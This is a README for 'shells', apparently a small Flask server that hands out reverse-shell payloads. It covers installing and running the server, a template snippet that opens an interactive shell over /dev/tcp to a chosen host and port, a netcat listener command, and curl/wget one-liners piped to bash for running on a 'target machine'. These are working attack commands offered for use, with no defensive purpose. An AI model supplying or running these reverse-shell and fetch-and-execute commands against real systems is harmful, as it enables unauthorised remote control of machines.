# shells

## setup and run
setup python environment
```bash
pipenv install
```

virtual environment and run
```bash
pipenv shell
flask run --port 8080 --host 0.0.0.0
```
or 
```
pipenv run flask run --port 8080 --host 0.0.0.0
```
### lazy run
runs in port 8000, change port if needed.
```
python3 app/__init__.py
```
## new command
add new command in `shells.template` specify the $host and $port, like below
```
if command -v sh > /dev/null 2>&1; then 
	/bin/sh -i >& /dev/tcp/$host/$port 0>&1
	exit;
fi
```

# give me a shell
Listen with netcat:
```
nc -lvp 1338
```

run this on target machine:
```
wget -qO- http://mi-ip-host:port/127.0.0.1:1338 | bash

curl http://mi-ip-host:port/127.0.0.1:1338 | bash
```